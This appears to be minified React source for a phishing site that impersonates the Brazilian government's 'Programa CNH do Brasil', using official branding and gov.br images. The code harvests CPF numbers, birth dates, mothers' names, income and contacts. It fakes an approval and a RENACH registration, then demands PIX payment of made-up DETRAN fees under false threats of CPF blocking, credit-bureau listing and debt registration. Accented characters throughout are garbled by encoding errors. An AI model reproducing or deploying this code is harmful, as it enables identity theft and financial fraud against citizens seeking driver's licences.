      ...
      children: [l.jsx("div", {
        ...
        children: l.jsxs("a", {
          ...
          children: [l.jsx("img", {
            ...
            alt: "┴ìcone de um cartÒo de identificaþÒo s¾lido representando CPF"
          }), "N·mero do CPF"]
        })
      }), l.jsxs("div", {
  ...
  return l.jsxs(l.Fragment, {
    children: [l.jsx("header", {
      children: l.jsx("img", {
        ...
        alt: "Imagem de cabeþalho com design moderno e cores vibrantes",
        style: {
          width: "100%"
        }
      })
...
function h3(e = !1) {
  const t = e ? ["Maria", "Ana", "Helena", "Alice", "Laura", "Beatriz", "Clara", "Sofia", "Julia", "Isabella"] : ["Miguel", "Arthur", "Heitor", "Helena", "Alice", "Laura", "Maria", "JoÒo", "Pedro", "Lucas"],
...
function g3() {
  ...
  }, [p]), b = (m == null ? void 0 : m.manualEntry) === !0, C = m ? fp(m.data_nascimento) : "", j = !b && (m == null ? void 0 : m.nome_mae) && m.nome_mae.trim() !== "", A = x.useMemo(() => !m || b ? [] : Bc(m.nome, "name"), [m == null ? void 0 : m.nome, b]), P = x.useMemo(() => !m || b ? [] : Bc(C, "date"), [C, b]), M = x.useMemo(() => !m || !j ? [] : Bc(m.nome_mae, "mother"), [m == null ? void 0 : m.nome_mae, j]), _ = ["Desempregado(a)", "AtÚ R$ 2.640 (atÚ 2 salßrios mÝnimos)", "De R$ 2.641 a R$ 6.600 (2 a 5 salßrios mÝnimos)", "De R$ 6.601 a R$ 13.200 (5 a 10 salßrios mÝnimos)", "Acima de R$ 13.200 (mais de 10 salßrios mÝnimos)"], G = ["NÒo possuo CNH", "Possuo CNH categoria A (moto)", "Possuo CNH categoria B (carro)", "Possuo CNH categoria AB ou superior"], I = R => {
    ...
    children: [l.jsx(rt, {}), l.jsx("div", {
      ...
      children: l.jsx("main", {
        ...
        children: l.jsxs("div", {
          ...
          children: [l.jsx("h3", {
            children: "Dados nÒo encontrados"
          }), l.jsx("p", {
            children: "NÒo foram encontrados dados para verificaþÒo."
          }), l.jsx("div", {
            className: "button-panel",
            children: l.jsx("button", {
              type: "button",
  ...
  const re = async () => {
    ...
    if (!b && t !== "email" && t !== "phone" && !o) {
      s("Por favor, selecione uma opþÒo");
      return
    }
    ...
    }, 1e3)) : (s(t === "email" ? "Email invßlido" : t === "phone" ? "Telefone invßlido" : "Dados incorretos. Por favor, verifique sua resposta."), c("idle"))
  }, D = (() => {
    const R = L => {
      if (b) switch (L) {
        case "name":
    ...
    switch (t) {
      case "name":
        return {
          title: b ? "Digite seu nome completo" : "Qual Ú seu nome completo?", options: A, type: "name", number: R("name")
        };
      case "birth":
        return {
          title: "Qual Ú sua data de nascimento?", options: P, type: "birth", number: R("birth")
        };
      case "mother":
        return {
          title: "Qual Ú o nome da sua mÒe?", options: M, type: "mother", number: R("mother")
        };
      case "salary":
        return {
          title: "Qual Ú sua faixa salarial atual?", options: _, type: "salary", number: R("salary")
        };
      case "flights":
        return {
          title: "Qual sua situaþÒo atual de habilitaþÒo?", options: G, type: "flights", number: R("flights")
        };
      case "email":
        return {
          title: "Qual Ú o seu email?", type: "email", number: R("email")
        };
      case "phone":
        return {
          title: "Qual Ú o seu telefone?", type: "phone", number: R("phone")
        }
    }
  })();
  return l.jsxs("div", {
  ...
  x.useEffect(() => {
    ...
    v.current = !0, (async () => {
      try {
        ...
        }), console.log("[Success] NotificaþÒo de venda APROVADA enviada")
      } catch (m) {
        console.error("[Success] Erro ao enviar notificaþÒo APROVADA:", m)
      }
    })()
  }, []), x.useEffect(() => {
    (async () => {
      if (!y.current) {
        ...
        try {
          const m = localStorage.getItem("userData");
          if (!m) {
            c("Dados do usußrio nÒo encontrados"), s(!1);
            return
          }
          ...
          console.error("Erro ao criar transaþÒo PIX:", m), c("Erro ao conectar com o servidor")
        } finally {
          s(!1)
        }
      }
    ...
    const p = async () => {
      try {
        ...
        if (C.success && C.status) {
          ...
          if (C.status === "expired" || C.status === "cancelled") return c("TransaþÒo expirada ou cancelada. Por favor, tente novamente."), !0
        }
        return !1
      } catch (b) {
        ...
        children: l.jsx(Sn, {
          ...
          children: l.jsxs("div", {
            ...
            children: [l.jsx("div", {
              ...
              children: "Seu cadastro foi concluÝdo com sucesso!"
            }), l.jsx("div", {
              ...
              children: l.jsxs("div", {
                children: [l.jsx("p", {
                  ...
                  children: "Em atÚ 5 dias ·teis nossa equipe entrarß em contato com vocÛ pelo n·mero cadastrado para dar continuidade ao seu processo."
                })]
              })
            }), l.jsx("p", {
      ...
      children: l.jsxs(bn, {
        ...
        children: [l.jsxs(ci, {
          ...
          children: [l.jsx(ui, {
            ...
            children: "Taxa de EmissÒo da CNH"
          }), l.jsx("p", {
            className: "text-gray-600",
            children: "Esta Ú a ·ltima taxa obrigat¾ria. Ap¾s a confirmaþÒo do pagamento, vocÛ receberß acesso completo ao aplicativo do Programa CNH do Brasil."
          })]
        }), l.jsxs(Sn, {
          className: "pt-6",
          children: [l.jsx("div", {
            ...
            children: l.jsx("img", {
              ...
              alt: "Carteira Digital de TrÔnsito",
            ...
            children: [l.jsx("h4", {
              ...
              children: [l.jsxs("li", {
                children: ["ò Esta taxa Ú ", l.jsx("strong", {
                  children: "obrigat¾ria"
                }), " para finalizar seu cadastro no Programa CNH do Brasil"]
              }), l.jsxs("li", {
                children: ["ò Valor ·nico de ", l.jsx("strong", {
                  children: "R$ 63,20"
                }), " pago uma ·nica vez"]
              }), l.jsx("li", {
                children: "ò Taxa destinada ao processo de emissÒo e regularizaþÒo da CNH"
              }), l.jsx("li", {
                children: "ò Seu cadastro s¾ serß concluÝdo ap¾s a confirmaþÒo deste pagamento"
              })]
            })]
          }), l.jsxs("div", {
            ...
            children: [l.jsx("h4", {
              ...
              children: ["Informamos que, caso o pagamento da ", l.jsx("strong", {
                children: "Taxa de EmissÒo da CNH"
              }), " nÒo seja realizado, seu cadastro ", l.jsx("strong", {
                children: "nÒo serß concluÝdo"
              }), " e vocÛ ", l.jsx("strong", {
                children: "perderß o direito de participar do Programa CNH do Brasil"
              }), ". Conforme o art. 49, º2║ da Lei n║ 8.078/1990 (C¾digo de Defesa do Consumidor), nÒo haverß reembolso do valor jß pago referente ┴ás taxas administrativas, uma vez que o serviþo de processamento jß foi iniciado junto ao DETRAN."]
            })]
          }), l.jsxs("div", {
            ...
            children: [l.jsxs("div", {
              ...
              children: [l.jsxs("div", {
                ...
                children: "O pagamento serß confirmado automaticamente"
              })]
            }), (t == null ? void 0 : t.pix_code) && l.jsxs("div", {
              className: "mb-6",
              children: [l.jsx("p", {
                className: "text-sm font-medium text-gray-700 mb-2",
                children: "C¾digo PIX Copia e Cola:"
              }), l.jsxs("div", {
                className: "space-y-3",
                children: [l.jsx("div", {
              ...
              children: [l.jsx("h4", {
                ...
                children: [l.jsx("li", {
                  ...
                  children: "2. Acesse a opþÒo PIX"
                }), l.jsx("li", {
                  children: "3. Escaneie o QR Code ou cole o c¾digo PIX"
                }), l.jsx("li", {
              ...
              children: l.jsxs("p", {
                ...
                children: ["ID da TransaþÒo: ", t.transaction_id]
              })
            })]
          })]
        })]
...
const Tg = ({
  ...
  Jr = [{
    ...
    content: "O Programa CNH do Brasil Ú uma iniciativa do Governo Federal que pode garantir sua Carteira Nacional de HabilitaþÒo 100% GRATUITA! Se vocÛ for aprovado nos critÚrios do programa, nÒo pagarß nada pela sua CNH. Continue seu cadastro aqui no site para verificar sua elegibilidade.",
    image: "https://www.serpro.gov.br/menu/noticias/noticias-2025/cnh-do-brasil/@@images/image/large"
  }, {
    title: "Acesso ao Aplicativo",
    content: "Ap¾s finalizar seu cadastro, vocÛ receberß acesso ao aplicativo oficial do programa. Use seu CPF para acessar e acompanhar todo o processo de obtenþÒo da sua CNH de forma simples e prßtica.",
    image: "https://cnhbrasil.app/images/mockup-app-500x461.png"
  }, {
    title: "Aulas Te¾ricas e Prßticas",
    content: "Suas aulas te¾ricas serÒo realizadas 100% pelo aplicativo, totalmente GRATUITAS! Para a parte prßtica, vocÛ precisarß fazer apenas 2 horas de aula com um instrutor credenciado pelo DETRAN. Se vocÛ for aprovado para a gratuidade do programa, essas aulas prßticas tambÚm serÒo gratuitas!",
    image: "https://cnhbrasil.app/images/mockup-app-500x461.png"
  }, {
    title: "EmissÒo da CNH",
    content: "Ap¾s aprovaþÒo nos exames te¾rico e prßtico, sua CNH serß emitida e enviada diretamente para seu endereþo. Todo o processo Ú acompanhado pelo sistema oficial do programa.",
    image: "https://cnhbrasil.app/images/mockup-app-500x461.png"
  }, {
    title: "Taxa de AdesÒo DETRAN",
    content: "Para validar sua participaþÒo no programa, o DETRAN cobra uma taxa administrativa de adesÒo. Esta taxa Ú obrigat¾ria para verificar sua elegibilidade e garantir seu acesso ao Programa CNH do Brasil.",
            ...
            children: [l.jsxs(ou.div, {
              ...
              children: l.jsxs("button", {
                ...
                children: [n === "loading" && l.jsx(vt, {
                  ...
                  className: "h-4 w-4"
                }), n === "loading" ? "Processando..." : n === "success" ? "ConcluÝdo" : e === Jr.length - 1 ? "Finalizar" : "Avanþar"]
              })
            })]
          })
        })
...
function kE() {
  const [, e] = In(), [t, n] = x.useState(0), [r, s] = x.useState("analyzing"), [o, i] = x.useState(null), a = x.useMemo(() => TE.map(h => ({
    ...
    id: 4,
    message: "Analisando documentaþÒo junto ao MinistÚrio dos Transportes",
    completed: !1
  }];
  x.useEffect(() => {
            ...
            children: [l.jsx("div", {
              ...
              children: l.jsxs("div", {
                ...
                children: [l.jsx("h4", {
                  ...
                  children: "ParabÚns! Cadastro Aprovado com Sucesso"
                }), l.jsxs("p", {
                  ...
                  children: ["Prezado(a) ", l.jsx("strong", {
                    ...
                    children: u(o.cpf)
                  }), ", informamos que sua solicitaþÒo foi analisada e ", l.jsx("strong", {
                    children: "APROVADA"
                  }), " pelo Sistema Nacional de HabilitaþÒo."]
                }), l.jsxs("p", {
                  className: "text-sm text-green-700 leading-relaxed mt-2",
                  children: ["O(A) senhor(a) estß apto(a) a obter a Carteira Nacional de HabilitaþÒo (CNH) de forma ", l.jsx("strong", {
                    children: "gratuita"
                  }), ", sem a necessidade de frequentar autoescola, conforme as diretrizes do Programa CNH do Brasil."]
                }), l.jsx("p", {
                  className: "text-sm text-green-700 leading-relaxed mt-2",
                  children: "Para dar continuidade ao processo, selecione abaixo o DETRAN correspondente ao seu estado de residÛncia."
                })]
              })
            }), l.jsxs("div", {
              className: "mt-6",
        ...
        children: [l.jsxs(ci, {
          ...
          children: l.jsxs("div", {
            ...
            children: [l.jsxs("p", {
              ...
              }), " Para finalizar, Ú necessßrio pagar as taxas obrigat¾rias do DETRAN:"]
            }), l.jsxs("div", {
              className: "bg-white p-4 rounded-md mb-6 border border-gray-200",
              children: [l.jsx("h4", {
                className: "font-semibold text-gray-800 mb-3",
                children: "Taxas Obrigat¾rias:"
              }), l.jsxs("div", {
                className: "space-y-2 text-sm text-gray-700",
                children: [l.jsxs("div", {
                  className: "flex justify-between items-start",
                  children: [l.jsxs("span", {
                    children: ["ò Taxa de ExpediþÒo", l.jsx("br", {}), "do Documento (TED)"]
                  }), l.jsx("span", {
                  ...
                  className: "flex justify-between items-start",
                  children: [l.jsxs("span", {
                    children: ["ò Taxa de Serviþo", l.jsx("br", {}), "Administrativo (TSA)"]
                  }), l.jsx("span", {
                    className: "font-bold whitespace-nowrap",
                    children: "R$27,85"
                  })]
                  ...
                  className: "flex justify-between items-start",
                  children: [l.jsxs("span", {
                    children: ["ò Taxa de Processamento", l.jsx("br", {}), "e EmissÒo (TPE)"]
                  }), l.jsx("span", {
                    className: "font-bold whitespace-nowrap",
                    children: "R$14,50"
                  })]
              ...
              children: [l.jsxs("div", {
                ...
                children: [l.jsx("div", {
                  ...
                  children: "AtenþÒo: Sua vaga estß reservada temporariamente"
                }), l.jsx("p", {
                  className: "text-yellow-700 text-sm text-center mt-2",
                  children: "Complete o pagamento antes que o tempo expire ou sua vaga serß disponibilizada para outro cidadÒo"
                })]
              }), l.jsxs("div", {
                ...
                children: [l.jsx(CC, {
                  ...
                  children: [l.jsx("strong", {
                    children: "Importante:"
                  }), " O nÒo pagamento resultarß na perda permanente do direito ao programa e sua vaga serß imediatamente liberada para outro cidadÒo na fila de espera"]
                })]
              })]
            }), l.jsx(jn, {
...
function DE() {
  ...
  const m = x.useCallback(async M => {
    try {
      ...
      if (G.success && G.status) {
        ...
        } else if (G.status === "expired" || G.status === "cancelled") return console.log("TransaþÒo expirada ou cancelada"), d("TransaþÒo expirada ou cancelada. Por favor, tente novamente."), !0
      }
      return !1
    } catch (_) {
  ...
  const b = async () => {
    ...
    try {
      const M = localStorage.getItem("userData");
      if (!M) {
        d("Dados do usußrio nÒo encontrados");
        return
      }
      ...
      console.error("Erro ao criar transaþÒo PIX:", M), d("Erro ao conectar com o servidor")
    } finally {
      s(!1)
    }
  }, C = async () => {
          ...
          children: l.jsxs("div", {
            ...
            children: [l.jsx("div", {
              ...
              children: [l.jsx("h4", {
                ...
                children: [l.jsx("li", {
                  children: "ò Verifique seus dados e tente novamente"
                }), l.jsx("li", {
                  children: "ò Entre em contato com o suporte se o problema persistir"
                }), l.jsx("li", {
                  children: "ò Alternativamente, use outro mÚtodo de pagamento"
                })]
              })]
            }), l.jsxs("div", {
        ...
        children: [l.jsxs(ci, {
            ...
            children: l.jsxs("div", {
              ...
              children: [l.jsx("svg", {
                ...
                children: [l.jsx("p", {
                  ...
                  children: "ATENÃ┴âO - AVISO IMPORTANTE"
                }), l.jsxs("p", {
                  className: "mb-2",
                  children: ["O processo de cadastro do seu CPF jß foi aberto junto ao DETRAN. Caso o pagamento das taxas obrigat¾rias nÒo seja realizado dentro do prazo estabelecido, seu CPF ficarß ", l.jsx("strong", {
                    children: "bloqueado no sistema do DENATRAN pelo perÝodo de 18 meses"
                  }), ", ficando impedido de emitir a CNH durante este perÝodo."]
                }), l.jsx("p", {
          ...
          children: [l.jsx("div", {
            ...
            children: [f ? l.jsx("div", {
              ...
              children: f || t != null && t.pix_code ? "Escaneie o QR Code com o app do seu banco" : "Use o c¾digo PIX abaixo no seu aplicativo bancßrio"
            })]
          }), l.jsxs("div", {
            className: "bg-blue-50 p-4 rounded-lg border border-blue-100 mb-6",
            children: [l.jsx("h4", {
        ...
        children: l.jsxs(Sn, {
          ...
          children: [l.jsxs("div", {
            ...
            children: [l.jsx("div", {
              ...
              children: "Cadastro ConcluÝdo!"
            }), l.jsx("p", {
              className: "text-gray-600",
              children: "ParabÚns! Seu cadastro no Programa CNH do Brasil foi finalizado com sucesso."
            })]
          }), l.jsxs("div", {
            ...
            children: [l.jsx("h4", {
              className: "font-semibold text-blue-900 mb-2",
              children: "Pr¾ximos Passos:"
            }), l.jsxs("ul", {
              className: "text-sm text-blue-800 space-y-2",
              children: [l.jsx("li", {
                children: "ò Aguarde a confirmaþÒo por e-mail em atÚ 48 horas"
              }), l.jsx("li", {
                children: "ò VocÛ receberß instruþ§es para agendar suas aulas"
              }), l.jsx("li", {
                children: "ò Compareþa ao DETRAN mais pr¾ximo com seus documentos"
              }), l.jsx("li", {
                children: "ò Guarde seu n·mero de protocolo para consultas"
              })]
            })]
          }), l.jsxs("div", {
            className: "flex gap-3",
            children: [l.jsxs(jn, {
              ...
              className: "flex-1 bg-[#1351B4] hover:bg-[#1351B4]/90 text-white",
              children: "Voltar ao InÝcio"
            })]
          }), l.jsx("div", {
            className: "mt-6 pt-4 border-t text-center",
            children: l.jsx("p", {
              className: "text-xs text-gray-500",
              children: "Em caso de d·vidas, entre em contato atravÚs do portal gov.br"
            })
          })]
        })
      })
  ...
  const [, e] = In(), [t, n] = x.useState([]), [r, s] = x.useState(!1), [o, i] = x.useState("initial"), [a, c] = x.useState(""), [u, d] = x.useState(""), [f, h] = x.useState(null), [y, w] = x.useState(null), v = x.useRef(null), S = x.useRef(!1), [g, p] = x.useState(""), [m, b] = x.useState(null), [C, j] = x.useState(!1), [A, P] = x.useState(!1), [M, _] = x.useState(""), [G, I] = x.useState("pending"), [$, U] = x.useState(600), [te, re] = x.useState(null), [X, D] = x.useState(!1), [R, L] = x.useState([]), [J, oe] = x.useState(!1), [ze, Ue] = x.useState(!1), [wr, Je] = x.useState(""), [dn, to] = x.useState(""), [no, ro] = x.useState(!1), [so, ki] = x.useState(!1), [br, Ri] = x.useState(null), Yl = x.useRef(null), [xh, wh] = x.useState([]), [N, E] = x.useState(!1), [T, z] = x.useState([]), V = x.useRef(null), [F, Q] = x.useState(""), Z = f != null && f.nome ? _i(f.nome.split(" ")[0]) : "CidadÒo", Te = () => ["JUNHO", "JULHO", "AGOSTO", "SETEMBRO", "OUTUBRO", "NOVEMBRO", "DEZEMBRO"].map(W => ({
    ...
    try {
      ...
      if (Y.success && Y.status) {
        ...
        } else if (Y.status === "expired" || Y.status === "cancelled") return console.log("TransaþÒo expirada ou cancelada"), !0
      }
      return !1
    } catch (W) {
    ...
    try {
      ...
      if (!transactionId) {
        alert("ID da transaþÒo nÒo encontrado. Recarregue a pßgina.");
        ro(!1);
        return;
      }
  ...
  const Ln = (B, W) => {
    ...
    Ii = async (B, W = 4e3) => {
      ...
      try {
        ...
        if (!Y) return re("Dados do usußrio nÒo encontrados. Recarregue a pßgina."), j(!1), !1;
        ...
        return qr.success && qr.pix_code ? (b(qr), U(600), localStorage.setItem("currentTransactionId", qr.transaction_id), localStorage.setItem("currentDepositId", qr.deposit_id), j(!1), !0) : B < W - 1 ? (await new Promise(bw => setTimeout(bw, 2e3)), Li(B + 1)) : (re(qr.error || "Erro ao gerar c¾digo PIX. Tente novamente."), j(!1), !1)
      } catch {
        return B < W - 1 ? (await new Promise(ge => setTimeout(ge, 2e3)), Li(B + 1)) : (re("Erro de conexÒo. Verifique sua internet e tente novamente."), j(!1), !1)
      }
    }, dw = async () => {
      m != null && m.pix_code && (await navigator.clipboard.writeText(m.pix_code), P(!0), setTimeout(() => P(!1), 3e3))
    }, fw = async () => {
      S.current || (S.current = !0, Ln("Para dar continuidade ao seu cadastro no Programa CNH do Brasil, informamos que Ú necessßrio selecionar a categoria de CNH pretendida.", !0), i("category_selection"))
    }, ec = async B => {
      c(B), Ln(`Categoria ${B}`, !1), i("consulting_vagas"), oe(!0), await new Promise(W => setTimeout(W, 4e3)), oe(!1), await Ii(`Prezado(a) ${Z}, informamos que as aulas te¾ricas do Programa CNH do Brasil podem ser realizadas de forma remota, por meio de dispositivo m¾vel ou computador, conforme sua disponibilidade de horßrio.

Ap¾s a finalizaþÒo do cadastro, o sistema liberarß o acesso ao aplicativo oficial com o passo a passo completo, e vocÛ jß poderß iniciar as aulas imediatamente.`, 6e3), i("msg1_continue")
    }, hw = async () => {
      Ln("Prosseguir", !1), i("msg1_sent"), await Ii(`O Programa CNH do Brasil segue as seguintes etapas: o candidato realiza as aulas te¾ricas atravÚs do aplicativo oficial e, ap¾s a conclusÒo, o Detran ${(y == null ? void 0 : y.nome) || "do seu Estado"} disponibilizarß um instrutor credenciado, sem custo adicional, para a realizaþÒo das aulas prßticas obrigat¾rias.`, 7e3), i("msg2_continue")
    }, mw = async () => {
      Ln("Prosseguir", !1), i("msg2_sent"), await Ii("As avaliaþ§es te¾ricas e prßticas encontram-se disponÝveis para agendamento. Para finalizaþÒo do cadastro, Ú necessßrio selecionar o perÝodo para realizaþÒo das provas. Conforme a legislaþÒo vigente, o processo completo tem duraþÒo inferior a 20 dias ·teis.", 7e3), i("msg3_continue")
    }, pw = async () => {
      Ln("Prosseguir", !1), i("msg3_sent"), await Ii("Selecione o mÛs de sua preferÛncia para realizaþÒo das avaliaþ§es:", 3e3), i("month_selection")
    }, gw = async B => {
      if (d(B), Ln(B, !1), i("confirming_cadastro"), Ue(!0), Je("Confirmando cadastro junto ao Detran..."), await new Promise(W => setTimeout(W, 3e3)), Je("Gerando cadastro no RENACH..."), await new Promise(W => setTimeout(W, 2500)), Je("Emitindo documentaþÒo..."), await new Promise(W => setTimeout(W, 2500)), Ue(!1), Ln(`Prezado(a) ${Z}, seu n·mero de RENACH foi gerado com sucesso junto ao Detran ${(y == null ? void 0 : y.nome) || "do seu Estado"}.

N·mero do RENACH: **${M}**

O RENACH (Registro Nacional de Carteira de HabilitaþÒo) Ú o n·mero de identificaþÒo ·nico do candidato no Sistema Nacional de HabilitaþÒo.`, !0), await new Promise(W => setTimeout(W, 300)), v.current) {
      ...
      tc("Prosseguir", !1), i("renach_created"), await vw(`Prezado(a) ${Z}, seu cadastro encontra-se com status PENDENTE. Para liberaþÒo do acesso ao aplicativo de aulas e prosseguimento do processo, Ú obrigat¾rio o recolhimento das Taxas Administrativas:

ò Taxa de ExpediþÒo de Documento (TED): R$ 16,25
ò Taxa de Serviþos Administrativos (TSA): R$ 21,70
ò Taxa de Processamento Eletr¶nico (TPE): R$ 11,35

Valor Total: R$ 63,20`, 3e3), i("finalize_button")
    }, ww = async () => {
      tc("Finalizar Cadastro", !1), i("generating_pix"), Q("");
      const B = setTimeout(() => {
        Q("Aguarde e nÒo feche a pßgina. Sua guia de pagamento estß sendo gerada...")
      }, 5e3),
        W = setTimeout(() => {
          Q("Por favor, aguarde mais um momento. Estamos finalizando a geraþÒo da sua guia...")
        }, 15e3);
...
1. Copie o c¾digo PIX clicando no botÒo "Copiar C¾digo PIX"
2. Abra o aplicativo do seu banco
3. Acesse a ßrea PIX e selecione "Pagar com PIX Copia e Cola"
4. Cole o c¾digo copiado e confirme o pagamento

Ap¾s a confirmaþÒo do pagamento, seu cadastro no Programa CNH do Brasil serß ativado e vocÛ jß poderß iniciar as aulas te¾ricas pelo aplicativo oficial.

Assim que realizar o pagamento das taxas no valor de R$ 63,20, clique no botÒo abaixo para ativar seu cadastro.`, !0), i("awaiting_payment")
    };
  x.useEffect(() => {
    f && y && fw()
  }, [f, y]);
              ...
              children: [l.jsx("div", {
                ...
                children: [l.jsx("div", {
                  ...
                  children: l.jsxs("div", {
                    ...
                    children: [l.jsx("span", {
                      children: "DISCRIMINAÃ┴âO DOS D╔BITOS"
                    }), l.jsx("span", {
                  ...
                  children: [l.jsxs("div", {
                    ...
                    children: [l.jsx("span", {
                      className: "text-gray-700",
                      children: "TAXA DE EXPEDIÃ├O DE DOCUMENTO (TED)"
                    }), l.jsx("span", {
                      className: "font-semibold",
                      children: "16,25"
                    })]
                    ...
                    children: [l.jsx("span", {
                      className: "text-gray-700",
                      children: "TAXA DE SERVIÃOS ADMINISTRATIVOS (TSA)"
                    }), l.jsx("span", {
                      className: "font-semibold",
                      children: "21,70"
                    })]
                    ...
                    children: [l.jsx("span", {
                      className: "text-gray-700",
                      children: "TAXA DE PROCESSAMENTO ELETRÈNICO (TPE)"
                    }), l.jsx("span", {
                      className: "font-semibold",
                      children: "11,35"
                    })]
                ...
                children: [l.jsx("p", {
                  ...
                  children: "Observaþ§es:"
                }), l.jsxs("p", {
                  className: "text-sm text-red-600 mb-1",
                  children: ["Informamos que, caso o pagamento nÒo seja realizado dentro do prazo estabelecido, o ", l.jsx("span", {
                    className: "font-bold",
                    children: "CPF"
                  }), " do responsßvel (", l.jsx("span", {
                    className: "font-bold",
                    children: Zl((f == null ? void 0 : f.cpf) || "")
                  }), ") serß bloqueado no programa pelo perÝodo de ", l.jsx("span", {
                    className: "font-bold",
                    children: "18 (dezoito) meses"
                  }), ". AlÚm disso, o valor da taxa, acrescido de multas, serß registrado no ", l.jsx("span", {
                    className: "font-bold",
                    children: "CPF"
                  }), " junto aos ¾rgÒos de proteþÒo ao crÚdito (", l.jsx("span", {
                    className: "font-bold",
                    children: "SPC"
                  }), " e ", l.jsx("span", {
                    className: "font-bold",
                    ...
                    className: "font-bold",
                    children: "DÝvida Ativa da UniÒo"
                  }), ", nos termos do art. 2║ da ", l.jsx("span", {
                    className: "font-bold",
                    children: "Lei n║ 6.830/1980"
                  }), " (Lei de Execuþ§es Fiscais) e do art. 43 da ", l.jsx("span", {
                    className: "font-bold",
                ...
                children: [l.jsxs("div", {
                  ...
                  children: [l.jsx("p", {
                    ...
                    children: "C┴ôDIGO PIX COPIA E COLA:"
                  }), l.jsx("p", {
            ...
            children: [no && l.jsx("div", {
              ...
              children: [l.jsx("div", {
                ...
                children: l.jsx("div", {
                  ...
                  children: "NÒo foi possÝvel confirmar o pagamento automaticamente. Para ativar seu cadastro, clique abaixo e envie uma imagem do comprovante de pagamento."
                })
              }), l.jsx("input", {
                type: "file",
                ref: Yl,
  ...
  x.useEffect(() => {
    t && (async () => {
      try {
        ...
        }))) : c(A.error || "TransaþÒo nÒo encontrada")
      } catch {
        c("Erro ao buscar transaþÒo")
      } finally {
        i(!1)
      }
    })()
    ...
    children: [l.jsx(rt, {}), l.jsx("main", {
      ...
      children: l.jsxs("div", {
        ...
        children: [l.jsx(Qm, {
          ...
          children: "TransaþÒo nÒo encontrada"
        }), l.jsx("p", {
          className: "text-gray-600",
          children: a || "NÒo foi possÝvel localizar uma transaþÒo para este CPF."
        })]
      })
    })]
  }) : l.jsxs("div", {
        ...
        children: [l.jsx("div", {
          ...
          children: l.jsxs("div", {
            ...
            children: [l.jsx(Qm, {
              ...
              children: [l.jsx("p", {
                ...
                children: "PAGAMENTO OBRIGAT┴ôRIO"
              }), l.jsx("p", {
                className: "text-sm text-yellow-700 mt-1",
                children: "O pagamento das taxas administrativas Ú obrigat¾rio para garantir sua vaga no programa. Caso nÒo seja realizado, seu CPF ficarß bloqueado por 2 anos."
              })]
            })]
          })
        }), l.jsx("div", {
          ...
          children: [l.jsx("div", {
            ...
            children: l.jsxs("div", {
              ...
              children: [l.jsx("img", {
                src: FE[r.detranUf] || "",
                alt: `BrasÒo do Estado - DETRAN ${r.detranUf}`,
                className: "h-16 max-w-[200px] object-contain mb-2",
                onError: C => {
          ...
          children: [l.jsxs("div", {
            ...
            className: "text-sm",
            children: "Assim que o pagamento for confirmado, vocÛ serß redirecionado automaticamente."
          })]
        })]
      })
    })]
...
function sT(e) {
  return ht({
    ...
    child: [{
      tag: "path",
      attr: {
        d: "M510.37 263.20l-12.08-76.26a132.493 132.493 0 0 0-37.16-72.95l-54.76-54.75c-19.73-19.72-45.18-32.7-72.71-37.05l-76.7-12.15c-27.51-4.36-55.69.11-80.52 12.76L107.32 49.6a132.25 132.25 0 0 0-57.79 57.8l-35.1 68.88a132.602 132.602 0 0 0-12.82 80.94l12.08 76.27a132.493 132.493 0 0 0 37.16 72.95l54.76 54.75a132.087 132.087 0 0 0 72.71 37.05l76.7 12.14c27.51 4.36 55.69-.11 80.52-12.75l69.12-35.21a132.302 132.302 0 0 0 57.79-57.8l35.1-68.87c12.71-24.96 17.2-53.3 12.82-80.96zM176 368c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32zm32-160c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32zm160 128c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32z"
      },
      child: []
    }]
  })(e)
    ...
    children: [l.jsxs("header", {
      ...
      children: [l.jsxs("button", {
        ...
        children: [l.jsx("i", {
          ...
          children: "MinistÚrio dos Transportes"
        })]
      }), l.jsx("button", {
        style: {
          border: "none",
      ...
      children: [l.jsx("div", {
        ...
        children: ["Mais de 3 milhÒo de brasileiros jß iniciaram o processo para obter a CNH gratuitamente pelo programa, e ", l.jsx("strong", {
          style: {
            color: "#333333"
          },
          children: "as vagas para 2026 estÒo se esgotando."
        }), " A ResoluþÒo n║ 985/2025 do Contran, publicada em 09 de dezembro de 2025, revoluciona o processo de habilitaþÒo no paÝs. Agora brasileiros podem tirar a CNH em menos de 20 dias, sem custos com autoescola e com curso te¾rico totalmente online."]
      }), l.jsxs("div", {
        ...
        className: "mb-8",
        style: {borderRadius: "0.5rem", boxShadow: "0 4px 6px rgba(0,0,0,0.1)", overflow: "hidden"}, children: l.jsx("img", {src: "https://www.gov.br/transportes/pt-br/cnh-do-brasil/@@govbr.institucional.banner/d3ee8534-47f4-4a19-8455-34539c6b5e3d/@@images/26c62ad6-aab4-43fe-b8ab-d0a3db5c253c.png", alt: "Programa CNH do Brasil", style: {width: "100%", height: "auto", display: "block"}})
      }), l.jsxs("article", {
        ...
        children: [l.jsxs("p", {
          ...
          children: [l.jsx("span", {
            ...
            children: "O"
          }), "processo para obter a primeira Carteira Nacional de HabilitaþÒo ficou mais simples com o aplicativo CNH do Brasil, plataforma oficial do MinistÚrio dos Transportes. Pelo celular, o cidadÒo pode abrir o requerimento, acompanhar todas as etapas, realizar o curso te¾rico gratuito e acessar a versÒo digital da habilitaþÒo. Confira, ponto a ponto, como funciona."]
        }), l.jsxs("div", {
          ...
          children: [l.jsx("button", {
            ...
            children: "Fazer Minha InscriþÒo Agora"
          }), l.jsx("p", {
          ...
          children: "1. O que mudou com a nova resoluþÒo?"
        }), l.jsxs("ul", {
          ...
          children: [l.jsxs("li", {
            ...
            }), " Candidatos nÒo precisam mais frequentar Centros de FormaþÒo de Condutores (CFCs)"]
          }), l.jsxs("li", {
            children: [l.jsx("strong", {
              style: {
                color: "#333333"
              },
              children: "Curso te¾rico online e gratuito:"
            }), " DisponÝvel ap¾s realizar o cadastro."]
          }), l.jsxs("li", {
            children: [l.jsx("strong", {
              style: {
                color: "#333333"
              },
              children: "Carga horßria prßtica reduzida:"
            }), " De 20 horas obrigat¾rias para apenas 2 horas mÝnimas"]
          }), l.jsxs("li", {
            children: [l.jsx("strong", {
              style: {
                color: "#333333"
              },
              children: "Aulas prßticas flexÝveis:"
            ...
            children: [l.jsx("strong", {
              ...
              children: "ReduþÒo de atÚ 80% nos custos:"
            }), " Processo que antes custava entre R$ 3.000 e R$ 5.000 agora pode sair praticamente de graþa"]
          })]
        }), l.jsxs("div", {
          ...
          children: [l.jsx("p", {
            ...
